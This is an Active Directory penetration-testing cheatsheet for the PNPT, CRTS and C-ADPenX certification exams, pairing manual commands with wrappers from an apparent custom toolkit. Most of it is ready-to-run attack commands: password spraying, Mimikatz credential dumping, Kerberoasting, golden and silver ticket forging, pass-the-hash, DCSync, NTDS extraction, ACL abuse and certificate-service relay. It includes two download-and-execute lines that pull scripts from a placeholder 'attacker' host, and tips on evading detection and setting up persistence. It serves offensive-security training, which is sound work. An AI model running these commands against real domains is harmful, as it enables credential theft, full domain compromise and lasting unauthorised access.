# Active Directory Penetration Testing Cheatsheet

This comprehensive cheatsheet provides both manual commands and automated approaches for Active Directory penetration testing, useful for the PNPT, CRTS, and C-ADPenX certifications.

## Table of Contents

1. [Environment Setup](#environment-setup)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Credential Harvesting](#credential-harvesting)
4. [Kerberos Attacks](#kerberos-attacks)
5. [Local Privilege Escalation](#local-privilege-escalation)
6. [Lateral Movement](#lateral-movement)
7. [Domain Enumeration](#domain-enumeration)
8. [ACL Abuse](#acl-abuse)
9. [Trust Relationships](#trust-relationships)
10. [Persistence](#persistence)
11. [Domain Compromise](#domain-compromise)
12. [Certificate Services Attacks](#certificate-services-attacks)
13. [Bloodhound](#bloodhound)
14. [Command Quick Reference](#command-quick-reference)

---

## Environment Setup

### Checking Environment

**Manual:**
```bash
# Check for prerequisite tools
which mimikatz netexec GetUserSPNs.py hashcat bloodhound-python

# Check Python modules
pip list | grep -E "impacket|ldap3|bloodhound"
```

**Automated:**
```bash
# Check for all required tools and environment configuration
./check-environment.py
```

---

## Initial Reconnaissance

### Network Scanning

**Manual:**
```bash
# Basic Nmap scan
nmap -sC -sV -p- 192.168.1.0/24 -oA nmap_full

# SMB scanning
nmap --script smb-* -p 445 192.168.1.0/24

# LDAP scanning
nmap --script ldap-* -p 389 192.168.1.0/24

# Responder for LLMNR/NBT-NS poisoning
responder -I eth0 -wrf
```

**Automated:**
```bash
# Network discovery using PowerShell-based enumeration
./powershell-enumeration.py scan -n 192.168.1.0/24

# Network enumeration using NetExec
./netexec-enumerator.py set username Administrator
./netexec-enumerator.py set password Password123!
./netexec-enumerator.py set target 192.168.1.100
./netexec-enumerator.py enum smb
```

### Password Spraying

**Manual:**
```bash
# NetExec password spraying
netexec smb 192.168.1.100 -u users.txt -p 'Spring2023!' --continue-on-success

# Kerbrute password spraying
kerbrute passwordspray -d contoso.local --dc 192.168.1.100 users.txt 'Spring2023!'
```

**Automated:**
```bash
# Using the toolkit's password spraying functionality
./adpentest-toolkit.py spray -t 192.168.1.100

# Full scan with automated password spraying
./adpentest-toolkit.py full -t 192.168.1.100
```

---

## Credential Harvesting

### Mimikatz (Local System)

**Manual:**
```bash
# Start mimikatz with admin privileges
mimikatz.exe

# Basic credential harvesting commands
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
sekurlsa::dpapi
vault::cred
exit
```

**Automated:**
```bash
# Dump all credentials from local system
./mimikatz-wrapper.py local all

# Dump specific credential types
./mimikatz-wrapper.py local creds
```

### Mimikatz (Remote System)

**Manual:**
```bash
# Create a PowerShell script with Invoke-Mimikatz
# Execute remotely
Enter-PSSession -ComputerName 192.168.1.100 -Credential (Get-Credential)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
```

**Automated:**
```bash
# Remote credential extraction
./mimikatz-wrapper.py remote -t 192.168.1.100 -d contoso.local -u administrator -p Password123!

# Remote credential extraction via Pass-the-Hash
./mimikatz-wrapper.py remote -t 192.168.1.100 -d contoso.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

### NetExec Credential Harvesting

**Manual:**
```bash
# SAM dumping
netexec smb 192.168.1.100 -u administrator -p 'Password123!' --sam

# LSA secrets
netexec smb 192.168.1.100 -u administrator -p 'Password123!' --lsa

# LSASS dumping
netexec smb 192.168.1.100 -u administrator -p 'Password123!' -M lsassy
```

**Automated:**
```bash
# Credential enumeration using NetExec wrapper
./netexec-enumerator.py set username administrator
./netexec-enumerator.py set password Password123!
./netexec-enumerator.py set target 192.168.1.100
./netexec-enumerator.py enum creds
```

---

## Kerberos Attacks

### Kerberoasting

**Manual:**
```bash
# Using Impacket
GetUserSPNs.py contoso.local/user:password -dc-ip 192.168.1.100 -request -output spns.txt

# Using PowerShell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\kerberoasted-hashes.csv -NoTypeInformation

# Cracking with Hashcat
hashcat -m 13100 spns.txt wordlist.txt --force
```

**Automated:**
```bash
# Using Kerberoasting automation
./kerberoast.py -t 192.168.1.100

# Using the AD Pentest Toolkit
./adpentest-toolkit.py kerberoast -t 192.168.1.100
```

### AS-REP Roasting

**Manual:**
```bash
# Using Impacket
GetNPUsers.py contoso.local/ -dc-ip 192.168.1.100 -usersfile users.txt -format hashcat -outputfile asrep.txt

# Using PowerShell
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | Format-List

# Cracking with Hashcat
hashcat -m 18200 asrep.txt wordlist.txt --force
```

**Automated:**
```bash
# Using Impacket automation
./impacket-toolkit.py asreproast -t 192.168.1.100
```

### Golden Ticket

**Manual:**
```bash
# Extract the krbtgt hash first (requires Domain Admin)
mimikatz.exe
lsadump::dcsync /domain:contoso.local /user:krbtgt
exit

# Create and use the Golden Ticket
mimikatz.exe
privilege::debug
kerberos::golden /domain:contoso.local /sid:S-1-5-21-... /krbtgt:hash /user:Administrator /ptt
exit

# Verify ticket is injected
klist
```

**Automated:**
```bash
# Create Golden Ticket
./mimikatz-wrapper.py local golden -d contoso.local -s S-1-5-21-1234567890-1234567890-1234567890 -k aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### Silver Ticket

**Manual:**
```bash
# Extract service account hash first
mimikatz.exe
lsadump::dcsync /domain:contoso.local /user:sqlservice
exit

# Create and use the Silver Ticket
mimikatz.exe
privilege::debug
kerberos::golden /domain:contoso.local /sid:S-1-5-21-... /target:sqlserver.contoso.local /service:MSSQLSvc /rc4:hash /user:Administrator /ptt
exit
```

**Automated:**
```bash
# Create Silver Ticket
./mimikatz-wrapper.py local silver -d contoso.local -s S-1-5-21-1234567890-1234567890-1234567890 -k aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -t sqlserver.contoso.local -v MSSQLSvc
```

---

## Local Privilege Escalation

### Windows Privilege Escalation

**Manual:**
```bash
# Run PowerUp
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1'); Invoke-AllChecks"

# Check with WinPEAS
winPEASx64.exe

# UAC Bypass with UACMe
akagi64.exe 23
```

**Automated:**
```bash
# PowerShell enumeration for privilege escalation opportunities
./powershell-enumeration.py local
```

### Token Manipulation

**Manual:**
```bash
# Using Incognito in Meterpreter
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator

# Using Mimikatz
token::elevate
token::list
token::impersonate /user:Administrator
```

**Automated:**
```bash
# Using Mimikatz wrapper for token manipulation
./mimikatz-wrapper.py local creds
```

---

## Lateral Movement

### Pass-the-Hash

**Manual:**
```bash
# Using Impacket's wmiexec
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 contoso/administrator@192.168.1.100

# Using NetExec
netexec smb 192.168.1.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami

# Using Mimikatz
sekurlsa::pth /user:administrator /domain:contoso.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
```

**Automated:**
```bash
# Using Mimikatz wrapper for Pass-the-Hash
./mimikatz-wrapper.py pth -t 192.168.1.100 -d contoso.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -c "whoami"

# Using Impacket toolkit
./impacket-toolkit.py wmiexec -t 192.168.1.100
```

### Pass-the-Ticket

**Manual:**
```bash
# Export tickets first
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit

# Inject a ticket
mimikatz.exe
privilege::debug
kerberos::ptt ticket.kirbi
exit

# Verify and use the ticket
klist
dir \\server\share
```

**Automated:**
```bash
# Extract tickets
./mimikatz-wrapper.py local tickets

# Pass-the-Ticket attack
./mimikatz-wrapper.py ptt -t 192.168.1.100 -c "dir \\\\server\\share"
```

### Using Impacket Tools

**Manual:**
```bash
# psexec
psexec.py contoso/administrator:Password123!@192.168.1.100

# smbexec
smbexec.py contoso/administrator:Password123!@192.168.1.100

# wmiexec
wmiexec.py contoso/administrator:Password123!@192.168.1.100

# dcomexec
dcomexec.py contoso/administrator:Password123!@192.168.1.100
```

**Automated:**
```bash
# Use Impacket toolkit to automate all tools
./impacket-toolkit.py psexec -t 192.168.1.100
./impacket-toolkit.py wmiexec -t 192.168.1.100
./impacket-toolkit.py smbclient -t 192.168.1.100
./impacket-toolkit.py all -t 192.168.1.100
```

---

## Domain Enumeration

### Domain User Enumeration

**Manual:**
```bash
# Using PowerView
Import-Module .\PowerView.ps1
Get-DomainUser | Export-CSV users.csv -NoTypeInformation
Get-DomainUser -AdminCount | Format-Table

# Using NetExec
netexec smb 192.168.1.100 -u administrator -p 'Password123!' --users
```

**Automated:**
```bash
# Using NetExec wrapper
./netexec-enumerator.py enum users

# Using PowerShell enumeration
./powershell-enumeration.py local

# Using SharpView automation
./sharpview-automator.py users
./sharpview-automator.py users -a  # Admin users only
```

### Domain Group Enumeration

**Manual:**
```bash
# Using PowerView
Import-Module .\PowerView.ps1
Get-DomainGroup | Export-CSV groups.csv -NoTypeInformation
Get-DomainGroupMember "Domain Admins" | Format-Table

# Using NetExec
netexec ldap 192.168.1.100 -u administrator -p 'Password123!' --groups
```

**Automated:**
```bash
# Using SharpView automation
./sharpview-automator.py groups
./sharpview-automator.py group-members -g "Domain Admins"

# Using PowerShell enumeration
./powershell-enumeration.py local
```

### Domain Computer Enumeration

**Manual:**
```bash
# Using PowerView
Import-Module .\PowerView.ps1
Get-DomainComputer | Export-CSV computers.csv -NoTypeInformation
Get-DomainComputer -OperatingSystem "*Server*" | Format-Table

# Using NetExec
netexec ldap 192.168.1.100 -u administrator -p 'Password123!' --computers
```

**Automated:**
```bash
# Using SharpView automation
./sharpview-automator.py computers
./sharpview-automator.py computers -s  # Servers only

# Using PowerShell enumeration
./powershell-enumeration.py local
```

### GPO Enumeration

**Manual:**
```bash
# Using PowerView
Import-Module .\PowerView.ps1
Get-DomainGPO | Export-CSV gpos.csv -NoTypeInformation
Get-GPOReport -All -ReportType Html -Path AllGPOs.html

# Get GPOs applied to a specific computer
Get-DomainComputer dc01 | Get-DomainGPO
```

**Automated:**
```bash
# Using SharpView automation
./sharpview-automator.py gpo

# Using PowerShell enumeration
./powershell-enumeration.py local
```

### Share Enumeration

**Manual:**
```bash
# Using PowerView
Import-Module .\PowerView.ps1
Find-DomainShare
Find-DomainShare -CheckShareAccess

# Using NetExec
netexec smb 192.168.1.100 -u administrator -p 'Password123!' --shares
netexec smb 192.168.1.100 -u administrator -p 'Password123!' -M spider_plus
```

**Automated:**
```bash
# Using NetExec wrapper
./netexec-enumerator.py enum spider

# Using SharpView automation
./sharpview-automator.py shares
```

---

## ACL Abuse

### Identifying Vulnerable ACLs

**Manual:**
```bash
# Using PowerView
Import-Module .\PowerView.ps1
Find-InterestingDomainAcl | Where-Object {$_.IdentityReferenceName -match "user"}
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Using BloodHound
# Upload data to BloodHound and search for "Abusable ACLs"
```

**Automated:**
```bash
# Using SharpView automation
./sharpview-automator.py acl

# Using PowerShell enumeration
./powershell-enumeration.py local
```

### Exploiting ACLs

**Manual:**
```bash
# Example: Adding user to a group using PowerView
Import-Module .\PowerView.ps1
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'targetuser'

# Example: Resetting a user's password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

**Automated:**
```bash
# This would typically require custom scripting for your specific scenario
# No direct automation provided in the toolset for ACL exploitation
```

---

## Trust Relationships

### Enumerating Trusts

**Manual:**
```bash
# Using PowerView
Import-Module .\PowerView.ps1
Get-DomainTrust
Get-ForestTrust

# Using NetExec/Impacket
netexec ldap 192.168.1.100 -u administrator -p 'Password123!' --trusted-for-delegation
```

**Automated:**
```bash
# Using SharpView automation
./sharpview-automator.py trusts

# Using PowerShell enumeration
./powershell-enumeration.py local
```

### Exploiting Trusts

**Manual:**
```bash
# Extracting TGTs from a trusted domain
mimikatz.exe
lsadump::dcsync /domain:trustedomain.local /user:krbtgt
kerberos::golden /domain:trustedomain.local /sid:S-1-5-21-... /rc4:krbtgthash /user:Administrator /service:krbtgt /target:contoso.local /ticket:trust.kirbi
exit

# Create inter-realm TGT
kerberos::golden /domain:contoso.local /sid:S-1-5-21-... /rc4:krbtgthash /user:Administrator /service:krbtgt /target:contoso.local /ticket:target.kirbi
exit
```

**Automated:**
```bash
# No direct automation provided in the toolset for trust exploitation
# Would require custom commands based on the specific trust relationship
```

---

## Persistence

### Golden Ticket

**Manual:**
```bash
# Create a Golden Ticket (already covered in Kerberos Attacks section)
mimikatz.exe
privilege::debug
kerberos::golden /domain:contoso.local /sid:S-1-5-21-... /krbtgt:hash /user:Administrator /ptt
```

**Automated:**
```bash
# Using Mimikatz wrapper
./mimikatz-wrapper.py local golden -d contoso.local -s S-1-5-21-1234567890-1234567890-1234567890 -k aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### DPAPI Backdoor

**Manual:**
```bash
# Backup the DPAPI master key
mimikatz.exe
privilege::debug
dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\S-1-5-21-...\[MasterKeyGUID]" /export
exit
```

**Automated:**
```bash
# Using Mimikatz wrapper for DPAPI extraction
./mimikatz-wrapper.py local all
```

### Shadow Credentials Attack

**Manual:**
```bash
# Using Whisker
Whisker.exe add /target:targetuser

# Verify and use the newly added credentials
Rubeus.exe asktgt /user:targetuser /certificate:[certificate] /password:[password]
```

**Automated:**
```bash
# No direct automation for Shadow Credentials in the current toolset
```

---

## Domain Compromise

### DCSync Attack

**Manual:**
```bash
# Using Mimikatz
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:contoso.local /all
lsadump::dcsync /domain:contoso.local /user:krbtgt
exit

# Using Impacket's secretsdump
secretsdump.py contoso/administrator:Password123!@192.168.1.100
```

**Automated:**
```bash
# Using Mimikatz wrapper
./mimikatz-wrapper.py local dcsync -d contoso.local -c dc01.contoso.local

# Using Impacket toolkit
./impacket-toolkit.py secretsdump -t 192.168.1.100
./impacket-toolkit.py dcsync -t 192.168.1.100
```

### NTDS.dit Extraction

**Manual:**
```bash
# Using Impacket's secretsdump with NTDS.dit
secretsdump.py -ntds ntds.dit -system registry.save -security security.save -sam sam.save LOCAL

# Using Mimikatz
mimikatz.exe
lsadump::lsa /inject
lsadump::sam
lsadump::secrets
exit
```

**Automated:**
```bash
# Using Impacket toolkit
./impacket-toolkit.py secretsdump -t 192.168.1.100
```

---

## Certificate Services Attacks

### ESC1 - Misconfigured Certificate Templates

**Manual:**
```bash
# Enumerate certificate templates
certutil -v -template

# Using Certify to find vulnerable templates
Certify.exe find

# Request a certificate
Certify.exe request /ca:CA01.contoso.local\CA /template:VulnerableTemplate /altname:administrator
```

**Automated:**
```bash
# No direct automation for certificate attacks in the current toolset
```

### ESC8 - NTLM Relay to AD CS Web Enrollment

**Manual:**
```bash
# Start NTLM Relay
ntlmrelayx.py -t http://ca.contoso.local/certsrv/certfnsh.asp -smb2support --adcs

# Force authentication (e.g., using Responder, PetitPotam)
PetitPotam.py -d contoso.local -u user -p password attacker-ip ca.contoso.local
```

**Automated:**
```bash
# No direct automation for certificate attacks in the current toolset
```

---

## BloodHound

### Data Collection

**Manual:**
```bash
# Using SharpHound
SharpHound.exe -c All --zipfilename bloodhound.zip

# Using BloodHound.py
bloodhound-python -u username -p password -d contoso.local -ns 192.168.1.100 -c All
```

**Automated:**
```bash
# Using AD Pentest Toolkit
./adpentest-toolkit.py bloodhound -t 192.168.1.100
```

### Analyzing Attack Paths

**Manual (UI-based):**
```
1. Start Neo4j database
2. Import data into BloodHound
3. Run queries like "Shortest Path to Domain Admins"
4. Analyze the graph visualization
```

**Automated:**
```bash
# Basic automation in BloodHound data collection
./adpentest-toolkit.py bloodhound -t 192.168.1.100
```

---

## Command Quick Reference

### NetExec Wrapper

```bash
# Set configuration
./netexec-enumerator.py set username Administrator
./netexec-enumerator.py set password Password123!
./netexec-enumerator.py set target 192.168.1.100

# Enumeration tasks
./netexec-enumerator.py enum smb        # Basic SMB enumeration
./netexec-enumerator.py enum users      # User enumeration
./netexec-enumerator.py enum creds      # Credential dumping
./netexec-enumerator.py enum spider     # Share spidering
./netexec-enumerator.py enum policy     # Password policy
```

### Kerberoast Automation

```bash
# Basic Kerberoasting against a target
./kerberoast.py -t 192.168.1.100

# Kerberoasting against multiple targets
./kerberoast.py -t 192.168.1.100 192.168.1.101 192.168.1.102
```

### Impacket Toolkit

```bash
# Run specific tools
./impacket-toolkit.py secretsdump -t 192.168.1.100
./impacket-toolkit.py smbclient -t 192.168.1.100
./impacket-toolkit.py psexec -t 192.168.1.100
./impacket-toolkit.py wmiexec -t 192.168.1.100
./impacket-toolkit.py asreproast -t 192.168.1.100
./impacket-toolkit.py dcsync -t 192.168.1.100

# Run all Impacket tools
./impacket-toolkit.py all -t 192.168.1.100
```

### PowerShell Enumeration

```bash
# Local enumeration
./powershell-enumeration.py local

# Remote enumeration
./powershell-enumeration.py remote -t 192.168.1.100 -u administrator -p Password123!

# Network scanning
./powershell-enumeration.py scan -n 192.168.1.0/24

# Full enumeration campaign
./powershell-enumeration.py full -t 192.168.1.100 192.168.1.101 -u administrator -p Password123!
```

### SharpView Automator

```bash
# Full enumeration
./sharpview-automator.py full -t 192.168.1.100 -u administrator -p Password123!

# Domain information
./sharpview-automator.py domain -t 192.168.1.100 -u administrator -p Password123!

# Domain trusts
./sharpview-automator.py trusts -t 192.168.1.100 -u administrator -p Password123!

# Users enumeration
./sharpview-automator.py users -t 192.168.1.100 -u administrator -p Password123!
./sharpview-automator.py users -a  # Admin users only

# Groups enumeration
./sharpview-automator.py groups -t 192.168.1.100 -u administrator -p Password123!
./sharpview-automator.py group-members -g "Domain Admins" -t 192.168.1.100 -u administrator -p Password123!

# Computer enumeration
./sharpview-automator.py computers -t 192.168.1.100 -u administrator -p Password123!
./sharpview-automator.py computers -s  # Servers only

# GPO enumeration
./sharpview-automator.py gpo -t 192.168.1.100 -u administrator -p Password123!

# ACL enumeration
./sharpview-automator.py acl -t 192.168.1.100 -u administrator -p Password123!
```

### Mimikatz Wrapper

```bash
# Local operations
./mimikatz-wrapper.py local all        # Run all local extraction techniques
./mimikatz-wrapper.py local creds      # Dump credentials locally
./mimikatz-wrapper.py local tickets    # Extract Kerberos tickets locally

# Remote operations
./mimikatz-wrapper.py remote -t 192.168.1.100 -d contoso.local -u administrator -p Password123!
./mimikatz-wrapper.py remote -t 192.168.1.100 -d contoso.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Golden/Silver ticket
./mimikatz-wrapper.py local golden -d contoso.local -s S-1-5-21-1234567890-1234567890-1234567890 -k aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
./mimikatz-wrapper.py local silver -d contoso.local -s S-1-5-21-1234567890-1234567890-1234567890 -k aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -t sqlserver.contoso.local -v MSSQLSvc

# DCSync
./mimikatz-wrapper.py local dcsync -d contoso.local -c dc01.contoso.local

# Pass-the-Hash
./mimikatz-wrapper.py pth -t 192.168.1.100 -d contoso.local -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -c "whoami"

# Pass-the-Ticket
./mimikatz-wrapper.py ptt -t 192.168.1.100 -c "dir \\\\server\\share"
```

### AD Pentest Toolkit

```bash
# Check environment
./adpentest-toolkit.py check

# Password spraying
./adpentest-toolkit.py spray -t 192.168.1.100

# NetExec enumeration
./adpentest-toolkit.py netexec -t 192.168.1.100 -s smb,users,creds,spider,policy

# Kerberoasting
./adpentest-toolkit.py kerberoast -t 192.168.1.100

# BloodHound collection
./adpentest-toolkit.py bloodhound -t 192.168.1.100

# Full scan with all tools
./adpentest-toolkit.py full -t 192.168.1.100
```

---

## Exam Specific Tips

### PNPT (Practical Network Penetration Tester)

1. Focus on initial entry points:
   - Start with network scanning and SMB enumeration
   - Use NetExec wrapper for quick reconnaissance
   - Try password spraying early with common passwords

2. For credential harvesting:
   - Use Mimikatz wrapper for local extraction
   - Try NTLM relay attacks if applicable
   - Dump SAM/LSA with NetExec when you get admin access

3. For privilege escalation:
   - Use PowerShell enumeration to find escalation paths
   - Look for misconfigured services and weak permissions
   - Use BloodHound for attack path visualization

### CRTS (Certified Red Team Specialist)

1. Focus on evasion and stealth:
   - Use PowerShell enumeration with stealth option
   - Avoid noisy scanning when possible
   - Use Pass-the-Hash/Pass-the-Ticket for lateral movement

2. For credential access:
   - Use targeted Kerberoasting with kerberoast.py
   - Perform DCSync when you have proper rights
   - Extract tickets carefully for later use

3. For persistence:
   - Use Mimikatz wrapper to create Golden/Silver tickets
   - Implement credential theft persistence for long-term access
   - Consider DPAPI abuse for storing credentials

### C-ADPenX (Certified Active Directory Pentesting Expert)

1. Focus on comprehensive AD enumeration:
   - Use SharpView automator for thorough domain enumeration
   - Identify domain trusts and relationships
   - Enumerate all privileged accounts and groups
   - Map out the entire AD environment using BloodHound

2. For advanced attacks:
   - Leverage Kerberos attack techniques (Golden/Silver tickets)
   - Identify and exploit vulnerable ACLs
   - Abuse misconfigured certificate templates if present
   - Look for delegation issues (constrained, unconstrained)

3. For domain dominance:
   - Use DCSync to extract all domain credentials
   - Identify persistence opportunities with Mimikatz
   - Utilize trust relationships for forest-wide compromise
   - Establish multiple persistence mechanisms

## Workflow & Tool Combinations

### Initial Foothold Workflow

1. Start with network discovery:
   ```bash
   ./powershell-enumeration.py scan -n 192.168.1.0/24
   ```

2. Identify and enumerate domain controllers:
   ```bash
   ./netexec-enumerator.py set target 192.168.1.100
   ./netexec-enumerator.py enum smb
   ```

3. Perform password spraying:
   ```bash
   ./adpentest-toolkit.py spray -t 192.168.1.100
   ```

4. With valid credentials, start domain enumeration:
   ```bash
   ./netexec-enumerator.py set username found_user
   ./netexec-enumerator.py set password found_password
   ./netexec-enumerator.py enum users
   ```

### Privilege Escalation Workflow

1. Look for Kerberoastable accounts:
   ```bash
   ./kerberoast.py -t 192.168.1.100
   ```

2. Try AS-REP Roasting:
   ```bash
   ./impacket-toolkit.py asreproast -t 192.168.1.100
   ```

3. Collect AD data with BloodHound:
   ```bash
   ./adpentest-toolkit.py bloodhound -t 192.168.1.100
   ```

4. If you have admin access to a workstation, dump credentials:
   ```bash
   ./mimikatz-wrapper.py remote -t 192.168.1.105 -d contoso.local -u administrator -p Password123!
   ```

### Lateral Movement Workflow

1. Use extracted hashes for Pass-the-Hash:
   ```bash
   ./mimikatz-wrapper.py pth -t 192.168.1.110 -d contoso.local -u administrator -H hash -c "whoami"
   ```

2. Use Impacket tools for execution:
   ```bash
   ./impacket-toolkit.py wmiexec -t 192.168.1.110
   ```

3. Extract more credentials from compromised hosts:
   ```bash
   ./netexec-enumerator.py set target 192.168.1.110
   ./netexec-enumerator.py enum creds
   ```

### Domain Compromise Workflow

1. Using your privileged access, run DCSync:
   ```bash
   ./mimikatz-wrapper.py local dcsync -d contoso.local -c dc01.contoso.local
   ```

2. Create and use Golden Tickets:
   ```bash
   ./mimikatz-wrapper.py local golden -d contoso.local -s S-1-5-21-1234567890-1234567890-1234567890 -k hash
   ```

3. Establish persistence using multiple methods:
   ```bash
   # Create Silver tickets for specific services
   ./mimikatz-wrapper.py local silver -d contoso.local -s S-1-5-21-1234567890-1234567890-1234567890 -k hash -t server.contoso.local -v cifs
   ```

## Final Tips

1. **Organization is key**: Keep detailed notes of all commands, findings, and credentials.

2. **Leverage automation efficiently**: Start with automated tools, then dig deeper manually where needed.

3. **Be methodical**: 
   - Enumerate thoroughly before attacking
   - Preserve access to compromised systems
   - Document your attack paths

4. **Avoid detection**:
   - Use the stealth options when available
   - Limit noisy scanning activities
   - Be careful with credential dumping on monitored systems

5. **For certification exams**:
   - Review the specific requirements before starting
   - Allocate your time wisely across different phases
   - Document everything for the final report
   - Take screenshots of critical findings

By combining these automated tools with a thorough understanding of Active Directory attack techniques, you'll be well-prepared for the PNPT, CRTS, and C-ADPenX certification exams.